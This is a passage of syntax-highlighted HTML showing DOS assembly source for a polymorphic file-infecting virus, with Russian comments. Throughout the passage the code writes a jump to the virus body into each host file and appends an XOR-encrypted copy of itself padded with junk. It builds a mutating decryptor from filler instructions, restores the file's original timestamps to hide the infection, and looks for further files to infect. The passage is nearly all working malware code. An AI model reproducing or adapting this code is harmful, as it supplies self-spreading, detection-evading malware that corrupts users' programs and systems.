        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                  </span><span class="sc1">; узнали стартовый адрес вируса</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">RGLOD</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; изменили стартовый код вируса</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; запись в файл</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RGLOD</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; В начало файла запишем переход</span><span class="sc0">
                                </span><span class="sc1">; на тело вируса</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Переход к концу файла</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">AddSize</span><span class="sc4">],</span><span class="sc2">100h</span><span class="sc0">       </span><span class="sc1">; Размер дописываемого мусора</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ClearGarbage</span><span class="sc0">            </span><span class="sc1">; не более 100h</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">AddSize</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Увеличим размер дописываемого мусора</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">CXLOD</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Увеличим размер зашифрованной части</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">sizeOK</span><span class="sc0">

</span><span class="sc5">ClearGarbage</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">AddSize</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; обнулить размер дописываемого мусора</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">CXLOD</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">sizeOK</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;       Аналогично первой MUTATION ENGINE:</span><span class="sc0">
</span><span class="sc1">;               выбор регистра из SI/DI</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">incSI</span><span class="sc4">],</span><span class="sc2">47h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">SelectDI</span><span class="sc0">                </span><span class="sc1">; если в прошлый раз был DI,</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">incSI</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; то сейчас выбрать SI</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">xorSI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">SILOD</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Si1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Si2</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Reg1</span><span class="sc0">
</span><span class="sc5">SelectDI</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">incSI</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; иначе выбрать DI</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">xorSI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">SILOD</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Si1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Si2</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Reg1</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; В зависимости от используемого регистра выбираем ничего не изменяющую</span><span class="sc0">
</span><span class="sc1">; инструкцию, которой заполняем место между командами полиморфного расшифровщика</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">RGINC</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">                  </span><span class="sc1">; dec ax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">noAX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; inc ax</span><span class="sc0">
</span><span class="sc5">noAX</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">                  </span><span class="sc1">; inc cx</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">noCX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">                  </span><span class="sc1">; dec ax</span><span class="sc0">
</span><span class="sc5">noCX</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">47h</span><span class="sc0">                  </span><span class="sc1">; inc di</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">noDI</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">4Bh</span><span class="sc0">                  </span><span class="sc1">; dec bx</span><span class="sc0">
</span><span class="sc5">noDI</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">46h</span><span class="sc0">                  </span><span class="sc1">; inc si</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">noSI</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0FBh</span><span class="sc0">                 </span><span class="sc1">; sti</span><span class="sc0">
</span><span class="sc5">noSI</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">                   </span><span class="sc1">; заполняем выбранной командой</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetPoly</span><span class="sc0">                 </span><span class="sc1">; код полиморфного расшифровщика</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">incSI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">RandSeed</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; пред. значение генератора</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; псевдослучайных чисел</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">RNDZ</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">63h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc5">RNDZ</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">12eh</span><span class="sc0">                 </span><span class="sc1">; ставим  inc REG  куда-нибудь</span><span class="sc0">
                                        </span><span class="sc1">; после 12eh</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">                 </span><span class="sc1">; ставим  inc REG  куда-нибудь</span><span class="sc0">
                                        </span><span class="sc1">; после 12eh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">RandSeed</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">RndSeed2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; переменная для другого</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5Fh</span><span class="sc0">                  </span><span class="sc1">; генератора псевдослучайных чисел</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">RND2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc5">RND2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">xorSI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">                 </span><span class="sc1">; ставим куда-нибудь xor si,nnnn</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">RndSeed2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">RndSeed3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">RND3</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">RND3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">106h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SILOD</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">   </span><span class="sc1">; куда-нибудь ближе к началу ставим mov REG,start</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">RndSeed3</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">RndSeed4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">RND4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">
</span><span class="sc5">RND4</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">11ah</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CXLOD</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">          </span><span class="sc1">; куда-нибудь ближе к началу ставим mov cx,len</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">RndSeed4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">RndSeed5</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">RND5</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">RND5</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">192h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0E2h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">                   </span><span class="sc1">; Zero register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">9Ah</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">                 </span><span class="sc1">; ближе к концу ставим loop в начало</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">RndSeed5</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Ch</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; смотрим на часы...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">130h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">RndSeed2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">; сколько секунд натикало - с тем числом и XOR'им</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">xorerv</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; когда-нибудь новая копия резидента</span><span class="sc0">
                                        </span><span class="sc1">; заработает (?), и она пока не заXORена</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virend</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virlen</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; переносим копию вируса в конец вируса</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">xorerv</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">; выбираем новую константу для</span><span class="sc0">
                                        </span><span class="sc1">; перешифровки резидента</span><span class="sc0">
</span><span class="sc5">Si1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virend</span><span class="sc0">
</span><span class="sc5">Si2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nope</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">nope</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0C3h</span><span class="sc0">       </span><span class="sc1">; Ставим RET после шифровщика</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Decode</span><span class="sc0">  </span><span class="sc1">; call 11a</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">nope</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">90h</span><span class="sc0">        </span><span class="sc1">; Восстанавливаем шифровщик</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virlen</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">AddSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virend</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">  </span><span class="sc1">; дописываем вирус к файлу с учетом мусора</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">DTA</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">DTA</span><span class="sc4">+</span><span class="sc2">18</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">; восстанавливаем старые дату/время создания файла</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">; закрываем отмучавшийся файл</span><span class="sc0">

</span><span class="sc1">; ---------- поиск и обработка следующего файла ------------</span><span class="sc0">
</span><span class="sc5">nxtfile</span><span class="sc4">:</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">          </span><span class="sc1">; За один раз поражаем не</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exitINT</span><span class="sc0">                 </span><span class="sc1">; более 3x файлов :(</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindNxt</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exitINT</span><span class="sc0">
